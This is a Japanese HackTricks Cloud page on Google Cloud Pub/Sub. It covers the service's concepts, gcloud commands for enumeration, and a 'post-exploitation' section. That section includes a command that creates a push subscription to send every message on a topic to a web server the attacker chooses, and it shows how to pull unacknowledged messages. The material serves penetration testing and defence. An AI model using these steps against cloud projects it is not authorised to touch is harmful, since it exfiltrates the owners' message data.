# GCP - Pub/Sub

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを入手したい**場合、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をご確認ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローする。
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## Pub/Sub <a href="#reviewing-cloud-pubsub" id="reviewing-cloud-pubsub"></a>

Google [**Cloud Pub/Sub**](https://cloud.google.com/pubsub/)は、独立したアプリケーションが**メッセージを送受信**できるサービスです。基本的に、アプリケーションは**トピック**に**サブスクライブ**して**メッセージを送受信**することができます（メッセージはメッセージの内容といくつかのメタデータで構成されます）。

**トピックはキュー**であり、メッセージが送信される場所です。一方、**サブスクリプション**は、ユーザーが**トピック内のメッセージにアクセス**するために使用する**オブジェクト**です。1つのトピックには複数のサブスクリプションが存在することができ、3つのタイプのサブスクリプションがあります。

* **Pull**: このサブスクリプションのユーザーはメッセージをポーリングする必要があります。
* **Push**: URLエンドポイントが指定され、メッセージは直ちに送信されます。
* **BigQueryテーブル**: Pushと同様ですが、メッセージはBigQueryテーブルに格納されます。

デフォルトでは、メッセージは**7日間保持**されますが、この期間は**最大31日間まで延長**することができます。また、10秒以内に**ACKがない場合はキューに戻されます**。

トピックはデフォルトで**Googleが管理する暗号化キー**を使用して暗号化されます。ただし、KMSから**CMEK（顧客管理型暗号化キー）**を選択することもできます。

**デッドレター**: サブスクリプションは**配信試行回数の最大値**を設定することができます。メッセージが配信できない場合、指定されたデッドレタートピックに**再公開**されます。

### バックアップとスキーマ

トピックには**バックアップ**があり、そこには**古い機密情報**が含まれている可能性があります。バックアップは、**ACKされていないメッセージ**とそれ以降のメッセージを保持します（デフォルトでは1週間生存します）。

トピックを作成する際に、**トピックのメッセージがスキーマに従う必要がある**と指定することができます。

### 列挙
```bash
# Get a list of topics in the project
gcloud pubsub topics list
gcloud pubsub topics describe <topic>
gcloud pubsub topics list-subscriptions <topic>
gcloud pubsub topics get-iam-policy <topic>

# Get a list of subscriptions across all topics
gcloud pubsub subscriptions list
gcloud pubsub subscriptions describe <subscription>
gcloud pubsub subscriptions get-iam-policy <subscription>

# Get list of schemas
gcloud pubsub schemas list
gcloud pubsub schemas describe <snapshot>

# Get list of snapshots
gcloud pubsub snapshots list
gcloud pubsub snapshots describe <snapshot>
```
ただし、より良い結果を得るためには、[**より大きなデータセットを要求する**](https://cloud.google.com/pubsub/docs/replay-overview)ことができます。これにはいくつかの前提条件があり、アプリケーションに影響を与える可能性があるため、自分が何をしているのか本当に理解していることを確認してください。

### ポストエクスプロイテーション

{% code overflow="wrap" %}
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"

# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create my_subscription --topic <topic_name>
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>

# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint <URL to push to>
```
{% endcode %}

## Pub/Sub Lite

[**Pub/Sub Lite**](https://cloud.google.com/pubsub/docs/choosing-pubsub-or-lite)は、**ゾーンストレージ**を備えたメッセージングサービスです。Pub/Sub LiteはPub/Subの一部であり、**低コスト**でありながら、高いボリュームのストリーミング（最大10,000,000メッセージ/秒）パイプラインやイベント駆動型システムに適しています。

Pub/Sub Liteでは、**トピック**と**サブスクリプション**がありますが、**バックアップ**や**スキーマ**はありません。また、以下の機能があります：

* **予約**: Pub/Sub Liteの予約は、メッセージストリームのために特定のリージョンで容量を予約することができる機能です。
* **操作**: Pub/Sub Liteの管理と管理に関連するアクションとタスクを指します。

### 列挙
```bash
# lite-topics
gcloud pubsub lite-topics list
gcloud pubsub lite-topics describe <topic>
gcloud pubsub lite-topics list-subscriptions <topic>

# lite-subscriptions
gcloud pubsub lite-subscriptions list
gcloud pubsub lite-subscriptions describe <subscription>

# lite-reservations
gcloud pubsub lite-reservations list
gcloud pubsub lite-reservations describe <topic>
gcloud pubsub lite-reservations list-topics <topic>

# lite-operations
gcloud pubsub lite-operations list
gcloud pubsub lite-operations describe <topic>
```
<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もし **HackTricks で会社を宣伝したい** または **PEASS の最新バージョンにアクセスしたい** または **HackTricks を PDF でダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式の PEASS & HackTricks スワッグ**](https://peass.creator-spring.com) を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を見つけてください、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションです
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に **参加** するか、 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォロー** してください。
* **ハッキングのトリックを共有するために、PR を** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **の GitHub リポジトリに提出してください。**

</details>
